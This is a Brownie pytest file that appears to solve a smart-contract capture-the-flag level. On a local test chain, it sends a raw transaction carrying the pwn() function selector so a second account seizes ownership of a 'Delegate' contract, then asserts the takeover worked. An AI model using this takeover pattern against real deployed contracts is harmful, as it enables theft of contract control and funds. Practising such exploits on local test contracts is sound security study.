from brownie import accounts, Delegation, Delegate, chain, web3
import brownie
import pytest


@pytest.fixture(scope="function")
def alice():
    return accounts[0]


@pytest.fixture(scope="function")
def bob():
    return accounts[1]


@pytest.fixture()
def delegation(alice, delegate):
    contract = alice.deploy(Delegation, delegate.address)
    return contract


@pytest.fixture()
def delegate(alice):
    contract = alice.deploy(Delegate, alice.address)
    return contract


def test_delegation(alice, bob, delegation, delegate):
    # tx = delegate.pwn({"from": bob})

    web3.eth.sendTransaction({"from": bob.address, "to": delegate.address,
                              "data": "0xdd365b8b"})
    # assert False, (f'got {delegate.getPwnSelector()}')

    assert delegate.owner() == bob.address, (
        f'incorrect owner; expect {bob.address}, got {delegate.owner()}'
    )
